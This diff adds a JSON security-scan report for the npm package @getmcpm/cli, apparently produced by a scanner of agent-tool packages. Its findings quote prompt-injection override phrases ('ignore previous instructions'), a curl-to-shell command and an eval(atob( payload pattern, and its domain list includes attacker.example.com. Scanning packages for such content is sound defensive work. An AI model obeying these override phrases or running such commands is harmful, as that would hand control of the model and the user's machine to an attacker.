@@ -1,0 +1,113 @@
+{
+  "item": {
+    "source": "npm",
+    "ecosystem": "npm",
+    "name": "@getmcpm/cli",
+    "version": "0.48.1",
+    "download": null
+  },
+  "archive_sha256": "7a456451abcd2279995377ee42dbcf18161738e4d988177fd3281d6dcdd215c6",
+  "findings": [
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "package/dist/chunk-3TWI3WPC.js",
+      "line": 109,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "f3a30ed9770471ccedce2abaa1d978b75ea639c094915b985b3bf388f729a786"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "package/dist/runner-NQW4KUUA.js",
+      "line": 23,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "28ecf8a41a6cad22b9492ce3307f2923a1b361dadaf88ad38f2b01b8cde90dad"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "package/dist/chunk-5HCKJTKV.js.map",
+      "line": 1,
+      "evidence": "curl evil.sh|sh",
+      "file_sha256": "322ef8c7bae2be00fc15566760558bf6b7f7a25d988c5a10e7de00cff9f65939"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "package/dist/chunk-3TWI3WPC.js.map",
+      "line": 1,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "df892492e9d91e824e3cb63cae220087ab10947ade59f37b2d28480f0733f238"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "package/dist/chunk-VIH4MIEM.js.map",
+      "line": 1,
+      "evidence": "eval(atob(",
+      "file_sha256": "df308313ff9e93d36e280b0ac67059d73542881223e9ef8c8c6dd720f884c166"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "package/dist/chunk-JPV366OU.js.map",
+      "line": 1,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "ca116ac46d0fa39ffe9692fedf8922d58f2f3dc7ec30d5dc81c4e38d3722a504"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "package/dist/runner-NQW4KUUA.js.map",
+      "line": 1,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "afaa3c538f7ae6a6adbc427c49e2658ca599d284c8d6094ff445c4669b590788"
+    }
+  ],
+  "flags": [],
+  "domains": [
+    "acct.blob.core",
+    "arxiv.org",
+    "attacker.example.com",
+    "ctfe.sigstore.dev",
+    "docs.astral.sh",
+    "docs.docker.com",
+    "fulcio.sigstore.dev",
+    "github.com",
+    "grafana.com",
+    "img.shields.io",
+    "json.schemastore.org",
+    "log2025-1.rekor.sigstore.dev",
+    "mcpm.sh",
+    "media.defense.gov",
+    "modelcontextprotocol.io",
+    "nodejs.org",
+    "noma.security",
+    "nvd.nist.gov",
+    "pypi.org",
+    "registry.modelcontextprotocol.io",
+    "rekor.sigstore.dev",
+    "slsa.dev",
+    "snyk.io",
+    "static.modelcontextprotocol.io",
+    "thehackernews.com",
+    "timestamp.sigstore.dev",
+    "token.actions.githubusercontent.com",
+    "www.arcade.dev",
+    "www.conventionalcommits.org",
+    "www.npmjs.com",
+    "www.ox.security",
+    "www.pillar.security",
+    "www.straiker.ai"
+  ],
+  "install_script": false,
+  "score": "critical"
+}
